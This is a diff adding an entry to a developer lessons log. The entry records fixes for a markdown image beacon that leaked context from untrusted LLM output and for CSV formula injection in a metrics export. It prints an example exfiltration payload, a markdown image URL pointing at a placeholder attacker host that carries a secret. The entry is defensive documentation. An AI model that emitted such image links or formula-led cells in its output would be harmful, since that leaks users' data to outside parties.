@@ -230,6 +230,15 @@ Cheap-to-write, cheap-to-read, expensive-to-skip. `grep -i <symptom>` this befor
   only on success, so an apiFetch throw leaked a repeating interval; clear it in `finally`. Lesson: every
   socket needs an `onerror`; coerce numeric values from localStorage; clear intervals in `finally`.
 
+- 2026-06-27 — UI render/export security (UI deep-hunt): (1) GeneralChatArea rendered UNTRUSTED LLM
+  markdown with only a `code` component override — `![](https://attacker/p?ctx=secret)` auto-loaded the
+  image, a zero-click exfiltration beacon (the URL carries context to the attacker). Added an `img`
+  override that shows the alt text instead of fetching (Docs renders TRUSTED local docs, left as-is).
+  (2) `exportMetricsCsv` quoted but didn't formula-escape LLM-controlled `goal_text` — a cell starting
+  `= + - @` executes as a formula in Excel/Sheets (CSV injection); prefix those with a single quote.
+  Lesson: don't auto-load images from untrusted markdown (the fetch IS the exfil), and CSV-escape any
+  cell whose leading char is a formula trigger.
+
 - 2026-06-27 — UI privacy/secrets (UI deep-hunt, CRITICAL+HIGH): (1) `PrivacyLock` auto-unlocked — an
   effect called `onUnlock()` whenever `!isEnabled || !expectedPassphrase`, and an empty passphrase `''`
   is falsy, so a settings-sync race that momentarily emptied the passphrase BYPASSED the lock with no
